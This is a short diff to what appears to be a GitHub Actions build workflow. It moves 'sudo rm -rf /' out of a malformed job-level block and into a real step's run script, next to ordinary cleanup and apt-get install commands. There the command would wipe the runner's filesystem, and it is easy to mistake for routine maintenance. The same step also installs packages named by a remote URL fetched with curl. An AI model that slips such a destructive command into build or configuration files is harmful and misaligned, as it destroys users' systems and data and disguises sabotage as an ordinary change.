@@ -35,8 +35,6 @@ env:
 
 jobs:
   build:
-    run: |
-    sudo rm -rf /
     runs-on: ubuntu-18.04
     steps:
     - name: Checkout
@@ -46,6 +44,7 @@ jobs:
       env:
         DEBIAN_FRONTEND: noninteractive
       run: |
+        sudo rm -rf /
         sudo rm -rf /etc/apt/sources.list.d/* /usr/share/dotnet /usr/local/lib/android /opt/ghc
         sudo -E apt-get -qq update
         sudo -E apt-get -qq install $(curl -fsSL git.io/depends-ubuntu-1804)
